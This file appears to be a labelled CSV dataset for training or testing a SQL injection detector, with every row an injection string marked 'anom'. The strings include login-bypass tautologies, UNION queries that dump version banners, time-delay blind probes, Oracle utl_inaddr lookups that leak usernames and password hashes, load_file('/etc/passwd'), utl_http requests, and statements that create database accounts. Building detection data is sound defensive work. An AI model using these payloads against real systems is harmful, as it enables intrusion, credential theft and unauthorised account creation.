payload,label
"or 1  =  1 or """"  =  ",anom
/**/or/**/1/**/  =  /**/1,anom
" select * from users where id  =  1 or "".  (  "" or 1  =  1 -- 1",anom
" select * from users where id  =  '1' union select ||/1,version  (    )   -- 1'",anom
" select * from users where id  =  '1' union select +\.,@@VERSION -- 1'",anom
or 1  =  1/*,anom
%27 or 1  =  1,anom
" select * from users where id  =  1 <@&@ union select 1,version  (    )   -- 1",anom
" select * from users where id  =  '1' union select $*$,@@VERSION -- 1'",anom
"1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115, ...",anom
" select * from users where id  =  '1' or $ 1  =  1 union select 1,@@VERSION -- 1'",anom
select * from users where id  =  1 or \.<1 or 1  =  1 -- 1,anom
" select * from users where id  =  '1' or \<\ union select 1,@@VERSION -- 1'",anom
" select * from users where id  =  1 union select 1||1,version  (    )   -- 1",anom
" select * from users where id  =  1 ||1 union select null,banner from v$version where rownum  =  1 -- 1",anom
select * from users where id  =  '1' or \.<\ or 1  =  1 -- 1',anom
" select * from users where id  =  1 or ""]{"" or 1  =  1 -- 1",anom
" select * from users where id  =  1 or "".@"" or 1  =  1 -- 1",anom
" select * from users where id  =  1 or ""$["" or 1  =  1 -- 1",anom
or 1 --',anom
" select * from users where id  =  1 or "",;"" or 1  =  1 -- 1",anom
"admin"" or 1  =  1#",anom
" select * from users where id  =  1 +  (  1  )   union select null,banner from v$version where rownum  =  1 -- 1",anom
\x27UNION SELECT,anom
PRINT,anom
" select * from users where id  =  '1' union select   (  \.  )  ,@@VERSION -- 1'",anom
or 1  =  1--,anom
1 or pg_sleep  (  __TIME__  )  --,anom
" select * from users where id  =  1 or "",#"" or 1  =  1 -- 1",anom
admin'  )   or   (  '1'  =  '1'/*,anom
or 2 between 1 and 3,anom
" select * from users where id  =  1 or ""  )  .""  =  1 or 1  =  1 -- 1",anom
" select * from users where id  =  1 or 1#"". union select null,version  (    )   -- 1",anom
admin' or '1'  =  '1,anom
 if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --,anom
" select * from users where id  =  1 union select 1,banner from v$version where rownum  =  1 -- 1",anom
""" or 0  =  0 --",anom
" select * from users where id  =  1 union select @ $_,version  (    )   -- 1",anom
select * from users where id  =  1 <@.$ or 1  =  1 -- 1,anom
" select * from users where id  =  1 or ""%."" or 1  =  1 -- 1",anom
" select * from users where id  =  1 + $+*$ union select null,@@VERSION -- 1",anom
" select * from users where id  =  1 or "",."" or 1  =  1 -- 1",anom
char%4039%41%2b%40SELECT,anom
" select * from users where id  =  1 or ""1&"" or 1  =  1 -- 1",anom
admin'  )   or   (  '1'  =  '1,anom
declare @s varchar   (  200  )   select @s   =   0x73656c6 ...,anom
"or 0  =  0 #""",anom
" select * from users where id  =  1 or "".]"" or 1  =  1 -- 1",anom
  )   or   (  'x'  =  'x,anom
" select * from users where id  =  1.<@$ union select 1,version  (    )   -- 1",anom
$  (  sleep 50  ) ,anom
" select * from users where id  =  1 *1 union select null,banner from v$version where rownum  =  1 -- 1",anom
"1 union all select 1,2,3,4,5,6,name from sysobjects where xtype   =   'u' --",anom
" select * from users where id  =  1 or 1#"". union select 'a',version  (    )   -- 1",anom
" select * from users where id  =  1 or 1#""; union select null,version  (    )   -- 1",anom
" select * from users where id  =  1 or 1#""? or 1  =  1 -- 1",anom
"""a"""" or 1  =  1--""",anom
" select * from users where id  =  1 *1 union select 1,banner from v$version where rownum  =  1 -- 1",anom
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",anom
" select * from users where id  =  '1' union select   (  \  )  ,@@VERSION -- 1'",anom
1 and user_name  (    )     =   'dbo',anom
"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",anom
" select * from users where id  =  1 or 1#""$ union select 1,version  (    )   -- 1",anom
" select * from users where id  =  1 or 1#""{ union select null,version  (    )   -- 1",anom
select * from users where id  =  '1' *$ . or 1  =  1 -- 1',anom
select * from users where id  =  1 +$+. or 1  =  1 -- 1,anom
select * from users where id  =  1 or   (  \+  )    =  1 or 1  =  1 -- 1,anom
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",anom
or 1  =  1 or ''  =  ',anom
select * from users where id  =  1   or 1  =  1 -- 1,anom
or 'text' > 't',anom
"1234 "" AND 1  =  0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",anom
" select * from users where id  =  1 or ""%["" or 1  =  1 -- 1",anom
" select * from users where id  =  1 or 1#"";  =  1 union select 1,version  (    )   -- 1",anom
admin' or '1'  =  '1'#,anom
select * from users where id  =  1 +$ 1 or 1  =  1 -- 1,anom
s,anom
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",anom
 select * from information_schema.tables--,anom
" select * from users where id  =  1 or ""$&"" or 1  =  1 -- 1",anom
1   )    )    or pg_sleep  (  __TIME__  )  --,anom
" select * from users where id  =  '1' union select !<@,version  (    )   -- 1'",anom
declare @q nvarchar   (  200  )   select @q   =   0x770061 ...,anom
 or 1  =  1 or ''  =  ',anom
select * from users where id  =  1 %!<1 or 1  =  1 -- 1,anom
declare @q nvarchar   (  200  )   select @q   =   0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec  (  @q  ) ,anom
" select * from users where id  =  1 or ""]1"" or 1  =  1 -- 1",anom
" select * from users where id  =  1 or $+<1 union select 1,@@VERSION -- 1",anom
or 'unusual'   =   'unusual',anom
 or 1 in   (  select @@version  )  --,anom
truncate,anom
as,anom
 or 3  =  3 --,anom
" select * from users where id  =  1 ||1 union select 1,banner from v$version where rownum  =  1 -- 1",anom
" select * from users where id  =  1 <@$$ union select 1,version  (    )   -- 1",anom
"admin""  )   or   (  ""1""  =  ""1",anom
" select * from users where id  =  1 or 1#""@ union select 'a',version  (    )   -- 1",anom
"1  )   or benchmark  (  10000000,MD5  (  1   )    )   #",anom
" select * from users where id  =  1 union select .1_,version  (    )   -- 1",anom
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT SYS.DATABASE_NAME FROM DUAL   )    )    AND 'i'  =  'i,anom
" or 0  =  0 #""",anom
select * from users where id  =  1 %$ 1 or 1  =  1 -- 1,anom
select * from users where id  =  1 %!<@ or 1  =  1 -- 1,anom
"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",anom
1  )   or sleep  (  __TIME__  )  #,anom
" select * from users where id  =  1 or ""1_"" or 1  =  1 -- 1",anom
" select * from users where id  =  1 <1## union select 1,version  (    )   -- 1",anom
" select * from users where id  =  1 + $+*\ union select null,@@VERSION -- 1",anom
select * from users where id  =  1. <@ or 1  =  1 -- 1,anom
 or true--,anom
select * from users where id  =  1 <@ or 1  =  1 -- 1,anom
" select * from users where id  =  1 or "".,"" or 1  =  1 -- 1",anom
admin' #,anom
" select * from users where id  =  1 <@$_ union select 1,version  (    )   -- 1",anom
" select * from users where id  =  1 or "",  (  "" or 1  =  1 -- 1",anom
" select * from users where id  =  1 or "",{"" or 1  =  1 -- 1",anom
" union select 1,load_file  (  '/etc/passwd'  )  ,1,1,1;",anom
"""  )  ;waitfor delay '0:0:__TIME__'--",anom
 or 'unusual'   =   'unusual',anom
"insert into mysql.user   (  user, host, password  )   values   (  'name', 'localhost', password  (  'pass123'   )    )   ",anom
"admin"" or ""1""  =  ""1""/*",anom
" select * from users where id  =  1 or ""1  (  ""  =  1 or 1  =  1 -- 1",anom
" select * from users where id  =  1 or \<1 union select 1,@@VERSION -- 1",anom
like,anom
 )    )    or pg_sleep  (  __TIME__  )  --,anom
select * from users where id  =  1 or $+<\ or 1  =  1 -- 1,anom
or 3  =  3,anom
" select * from users where id  =  1 or ""  (  ."" or 1  =  1 -- 1",anom
select * from users where id  =  1 or   (  $+  )    =  1 or 1  =  1 -- 1,anom
exec sp,anom
" select * from users where id  =  1 or \+<$ union select 1,@@VERSION -- 1",anom
select * from users where id  =  1 or \<$ or 1  =  1 -- 1,anom
" select * from users where id  =  1.&&1 union select 1,version  (    )   -- 1",anom
admin' or 1  =  1/*,anom
a' waitfor delay '0:0:10'--,anom
" select * from users where id  =  1 +  (  \  )   union select null,@@VERSION -- 1",anom
" select * from users where id  =  1 union select .1$_,version  (    )   -- 1",anom
and 1 in   (  select var from temp  )  --,anom
hi'  )   or   (  'a'  =  'a,anom
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i",anom
"admin"" or 1  =  1",anom
"""  )   or true--",anom
" select * from users where id  =  '1' or $ .  =  1 union select 1,@@VERSION -- 1'",anom
" select * from users where id  =  1 or ""  (  {"" or 1  =  1 -- 1",anom
1  )   or pg_sleep  (  __TIME__  )  --,anom
" select * from users where id  =  1 or ""{."" or 1  =  1 -- 1",anom
"""  )   or sleep  (  __TIME__  )    =  """,anom
select * from users where id  =  1.<@. or 1  =  1 -- 1,anom
"admin""  )   or   (  ""1""  =  ""1""--",anom
" select * from users where id  =  1<@.. union select 1,version  (    )   -- 1",anom
" select * from users where id  =  '1' + @ 1 union select 1,version  (    )   -- 1'",anom
select * from users where id  =  1 + \+%1 or 1  =  1 -- 1,anom
" select * from users where id  =  1 or "";1"" or 1  =  1 -- 1",anom
" select * from users where id  =  1 or ""%&"" or 1  =  1 -- 1",anom
1 and 1  =  1,anom
or 0  =  0 #,anom
union select * from users where login   =   char ...,anom
" select * from users where id  =  1 union select 1||@,version  (    )   -- 1",anom
admin'  )   or '1'  =  '1'--,anom
" select * from users where id  =  1 or ""{;"" or 1  =  1 -- 1",anom
" select * from users where id  =  '1' or """"<@ union select 1,version  (    )   -- 1'",anom
" select * from users where id  =  1 or ""?,"" or 1  =  1 -- 1",anom
" select * from users where id  =  '1' ||1 union select 1,banner from v$version where rownum  =  1 -- 1'",anom
"1 or benchmark  (  10000000,MD5  (  1   )    )   #",anom
procedure,anom
or ''  =  ',anom
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT SYS.LOGIN_USER FROM DUAL   )    )    AND 'i'  =  'i,anom
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",anom
" select * from users where id  =  1 or   (  \.  )    =  1 union select 1,@@VERSION -- 1",anom
select * from users where id  =  '1' or $ 1  =  1 or 1  =  1 -- 1',anom
""" or """"^""",anom
"""-""",anom
" select * from users where id  =  1 or \<   =  1 union select 1,@@VERSION -- 1",anom
" select * from users where id  =  1 union select 1<@$,version  (    )   -- 1",anom
" select * from users where id  =  1 *\ union select null,@@VERSION -- 1",anom
" select * from users where id  =  '1' or !<@ union select 1,version  (    )   -- 1'",anom
" select * from users where id  =  1 or "".%"" or 1  =  1 -- 1",anom
admin'/*,anom
" select * from users where id  =  1 or ""  (  #"" or 1  =  1 -- 1",anom
||UTL_HTTP.REQUEST,anom
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i",anom
" select * from users where id  =  '1'<@.. union select 1,version  (    )   -- 1'",anom
"""   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",anom
" select * from users where id  =  1 <@.$ union select 1,version  (    )   -- 1",anom
" select * from users where id  =  1 or $ .  =  1 union select 1,@@VERSION -- 1",anom
select * from users where id  =  '1' <@.$ or 1  =  1 -- 1',anom
1 uni/**/on select all from where,anom
" select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",anom
" select * from users where id  =  1 or 1#""? union select null,version  (    )   -- 1",anom
admin'  )   or '1'  =  '1'#,anom
||utl_http.request  (  'httP://192.168.1.1/'  )  ||',anom
or '7659'  =  '7659,anom
" select * from users where id  =  1 or ""{@"" or 1  =  1 -- 1",anom
" select * from users where id  =  1 union select +!<1,version  (    )   -- 1",anom
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",anom
" select * from users where id  =  1 or ""  (  @"" or 1  =  1 -- 1",anom
or true--,anom
" select * from users where id  =  1 union select !<1,version  (    )   -- 1",anom
" select * from users where id  =  '1' union select \#,@@VERSION -- 1'",anom
" select * from users where id  =  1 or 1#""{ union select 1,version  (    )   -- 1",anom
""" or true--",anom
select * from users where id  =  1. or 1  =  1 -- 1,anom
" select * from users where id  =  1 or @#"",  =  1 union select 1,version  (    )   -- 1",anom
" select * from users where id  =  1 or "";@"" or 1  =  1 -- 1",anom
â or 3  =  3 --,anom
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT global_name FROM global_name   )    )    AND 'i'  =  'i,anom
" select * from users where id  =  1 +1 union select null,banner from v$version where rownum  =  1 -- 1",anom
" select * from users where id  =  1 or "",,""  =  1 or 1  =  1 -- 1",anom
" select * from users where id  =  1 + $+%1 union select null,@@VERSION -- 1",anom
" select * from users where id  =  1 or 1#""? union select version  (    )  ,version  (    )   -- 1",anom
" select * from users where id  =  1 or ""  )  1"" or 1  =  1 -- 1",anom
 or uid like '%,anom
select * from users where id  =  '1' <@&1 or 1  =  1 -- 1',anom
" select * from users where id  =  '1' union select !<1,version  (    )   -- 1'",anom
" select * from users where id  =  1 or \<\. union select 1,@@VERSION -- 1",anom
" select * from users where id  =  1 or ""{  (  ""  =  1 or 1  =  1 -- 1",anom
" select * from users where id  =  1 or ""%_"" or 1  =  1 -- 1",anom
select * from users where id  =  1 +   (  \.  )   or 1  =  1 -- 1,anom
" select * from users where id  =  '1' union select \,@@VERSION -- 1'",anom
0 or 1  =  1,anom
select * from users where id  =  1 &@ or 1  =  1 -- 1,anom
"admin""  )   or ""1""  =  ""1",anom
select * from users where id  =  1 or \<   =  1 or 1  =  1 -- 1,anom
" select * from users where id  =  1 or ""??"" or 1  =  1 -- 1",anom
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",anom
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i",anom
select * from users where id  =  1 + $+%$ or 1  =  1 -- 1,anom
select * from users where id  =  '1' + $+%\ or 1  =  1 -- 1',anom
""" or """"*""",anom
"hi or 1  =  1 --""",anom
" select * from users where id  =  1. union select null,banner from v$version where rownum  =  1 -- 1",anom
" select * from users where id  =  '1' or 1^  =  1 union select 1,banner from v$version where rownum  =  1 -- 1'",anom
" select * from users where id  =  '1' union select ""?""_,version  (    )   -- 1'",anom
select * from information_schema.tables--,anom
select * from users where id  =  1 or \<\. or 1  =  1 -- 1,anom
   (  select top 1,anom
Ã½ or 1  =  1 --,anom
a' --,anom
 or 1  =  1 /*,anom
" select * from users where id  =  1 or 1#"", union select null,version  (    )   -- 1",anom
" select * from users where id  =  '1' union select $ .,@@VERSION -- 1'",anom
--,anom
"exec sp_addlogin 'name' , 'password'",anom
" select * from users where id  =  1   union select null,banner from v$version where rownum  =  1 -- 1",anom
0x77616974666F722064656C61792027303A303A31302700 exec  (  @s  ) ,anom
" select * from users where id  =  1 or "".  )  "" or 1  =  1 -- 1",anom
" select * from users where id  =  1 or @<@  =  1 union select 1,version  (    )   -- 1",anom
group by userid having 1  =  1--,anom
" select * from users where id  =  1 + \+%1 union select null,@@VERSION -- 1",anom
select * from users where id  =  1 *1 or 1  =  1 -- 1,anom
" select * from users where id  =  1 or @#"";  =  1 or 1  =  1 -- 1",anom
‘ or 1  =  1 --,anom
" select * from users where id  =  1 *\. union select null,@@VERSION -- 1",anom
select * from users where id  =  1 %  (  @  )   or 1  =  1 -- 1,anom
or 'a'  =  'a,anom
declare @s varchar  (  22  )   select @s   = ,anom
" select * from users where id  =  1 union select 1<@,version  (    )   -- 1",anom
" select * from users where id  =  1 + \+*\ union select null,@@VERSION -- 1",anom
" select * from users where id  =  1 or 1#"". union select version  (    )  ,version  (    )   -- 1",anom
@variable,anom
select * from users where id  =  1 +  (  1  )   or 1  =  1 -- 1,anom
" select * from users where id  =  1 union select @ 1$,version  (    )   -- 1",anom
" select * from users where id  =  1 union select @ 1a,version  (    )   -- 1",anom
" select * from users where id  =  1 or  @$#  =  1 union select 1,version  (    )   -- 1",anom
" select * from users where id  =  '1' or   (  \.  )    =  1 union select 1,@@VERSION -- 1'",anom
 and 1 in   (  select var from temp  )  --,anom
" select * from users where id  =  '1' union select 1""!"",banner from v$version where rownum  =  1 -- 1'",anom
" select * from users where id  =  1 or ""1]"" or 1  =  1 -- 1",anom
" select * from users where id  =  1 or ""$?"" or 1  =  1 -- 1",anom
or x  =  x,anom
or a  =  a,anom
or '1'  =  '1,anom
" select * from users where id  =  11<1# union select 1,version  (    )   -- 1",anom
   )    )    or    (    (   'x'   )    )     =     (    (   'x,anom
" select * from users where id  =  '1' or \.<1 union select 1,@@VERSION -- 1'",anom
" select * from users where id  =  '1' <@&1 union select 1,version  (    )   -- 1'",anom
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",anom
select * from users where id  =  1 <@<@ or 1  =  1 -- 1,anom
" select * from users where id  =  1 union select @<@$,version  (    )   -- 1",anom
" select * from users where id  =  '1' <@<@ union select 1,version  (    )   -- 1'",anom
" select * from users where id  =  1 or ""$_"" or 1  =  1 -- 1",anom
" select * from users where id  =  1 or 1#""{ union select version  (    )  ,version  (    )   -- 1",anom
a' or 1  =  1--,anom
 )   or   (  a  =  a,anom
"""   )    )    or    (    (   ""x""   )    )     =     (    (   ""x",anom
" select * from users where id  =  1 or 1#""; or 1  =  1 -- 1",anom
" select * from users where id  =  '1' <@$_ union select 1,version  (    )   -- 1'",anom
-- &password  = ,anom
select * from users where id  =  1 <@. or 1  =  1 -- 1,anom
" select * from users where id  =  1 or ""  (    )  "" or 1  =  1 -- 1",anom
" select * from users where id  =  1 %$ 1 union select null,@@VERSION -- 1",anom
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  3   )    )    AND 'i'  =  'i",anom
 or '1'  =  '1,anom
admin' or 1  =  1,anom
" select * from users where id  =  1 or "";,""  =  1 or 1  =  1 -- 1",anom
" select * from users where id  =  1 union select @||1,version  (    )   -- 1",anom
" select * from users where id  =  1 +\+. union select null,@@VERSION -- 1",anom
" select * from users where id  =  1 or ""  )  ,"" or 1  =  1 -- 1",anom
" union select * from users where login   =   char  (  114,111,111,116  )  ;",anom
" select * from users where id  =  1 or 1#""? union select 1,version  (    )   -- 1",anom
 or 1  =  1--,anom
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",anom
pg_sleep  (  __TIME__  )  --,anom
‘ or 3  =  3 --,anom
" select * from users where id  =  1 -1<@ union select 1,version  (    )   -- 1",anom
" select * from users where id  =  1 or ""$#"" or 1  =  1 -- 1",anom
" select * from users where id  =  1 or ""  )  ]"" or 1  =  1 -- 1",anom
"  )   or benchmark  (  10000000,MD5  (  1   )    )   #",anom
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  column_name   )    )    FROM sys.all_tab_columns   )    )    AND 'i'  =  'i,anom
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i",anom
""" or """" """,anom
delete,anom
 or 1  =  1 --,anom
1' and non_existant_table   =   '1,anom
" select * from users where id  =  1 or ""&  )  "" or 1  =  1 -- 1",anom
" select * from users where id  =  '1' + $ . union select 1,@@VERSION -- 1'",anom
declare @s varchar  (  200  )   select @s   =   0x77616974 ...,anom
" select * from users where id  =  1 or "";["" or 1  =  1 -- 1",anom
" select * from users where id  =  '1' or \.<   =  1 union select 1,@@VERSION -- 1'",anom
" select * from users where id  =  1 union select @<@,version  (    )   -- 1",anom
" select * from users where id  =  1 -@<@ union select 1,version  (    )   -- 1",anom
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT host_name FROM v$instance   )    )    AND 'i'  =  'i,anom
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",anom
select * from users where id  =  1 +   (  \+  )   or 1  =  1 -- 1,anom
" select * from users where id  =  1 or "".["" or 1  =  1 -- 1",anom
" select * from users where id  =  1 or ""  (  ["" or 1  =  1 -- 1",anom
UNION ALL SELECT,anom
" select * from users where id  =  1 or ""1#"" or 1  =  1 -- 1",anom
select * from users where id  =  1 or \<1 or 1  =  1 -- 1,anom
" select * from users where id  =  1 | |1 union select 1,banner from v$version where rownum  =  1 -- 1",anom
x' or full_name like '%bob%,anom
 or 2 > 1,anom
select * from users where id  =  1.*1 or 1  =  1 -- 1,anom
"""  )   or pg_sleep  (  __TIME__  )  --",anom
 ',anom
" select * from users where id  =  1 or $<\. union select 1,@@VERSION -- 1",anom
" select * from users where id  =  1 or ""@  )  "" or 1  =  1 -- 1",anom
select * from users where id  =  1 or \.<$ or 1  =  1 -- 1,anom
 )   or sleep  (  __TIME__  )    =  ',anom
sleep 50',anom
" select * from users where id  =  '1' + 1||1 union select 1,banner from v$version where rownum  =  1 -- 1'",anom
select * from users where id  =  1 + $+%\ or 1  =  1 -- 1,anom
" select * from users where id  =  1 or "";  (  "" or 1  =  1 -- 1",anom
or sleep  (  __TIME__  )    =  ',anom
" select * from users where id  =  1 or "";_"" or 1  =  1 -- 1",anom
" select * from users where id  =  1 or 1#"". union select 1,version  (    )   -- 1",anom
" select * from users where id  =  1 union select  @ $,version  (    )   -- 1",anom
" select * from users where id  =  1 union select +!<@,version  (    )   -- 1",anom
" select * from users where id  =  1 <@<@ union select null,version  (    )   -- 1",anom
or 2 > 1,anom
anything' OR 'x'  =  'x,anom
" select * from users where id  =  1 or \<\ union select 1,@@VERSION -- 1",anom
" select * from users where id  =  1 union select   (  1  )  ,banner from v$version where rownum  =  1 -- 1",anom
" select * from users where id  =  1 *  (  \  )   union select null,@@VERSION -- 1",anom
&',anom
a' or 3  =  3--,anom
" select * from users where id  =  '1' or $+<$ union select 1,@@VERSION -- 1'",anom
" select * from users where id  =  1 +1 union select 1,banner from v$version where rownum  =  1 -- 1",anom
"admin""or 1  =  1 or """"  =  """,anom
uni/**/on sel/**/ect,anom
""" or """"&""",anom
" select * from users where id  =  1 or ""?;"" or 1  =  1 -- 1",anom
1 waitfor delay '0:0:10'--,anom
bfilename,anom
admin'  )   or   (  '1'  =  '1'--,anom
UEf,anom
 -- &password  = ,anom
1 or sleep  (  __TIME__  )  #,anom
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",anom
" select * from users where id  =  '1' union select $[""],@@VERSION -- 1'",anom
" select * from users where id  =  '1' + @  (  1  )   union select 1,version  (    )   -- 1'",anom
or sleep  (  __TIME__  )  #,anom
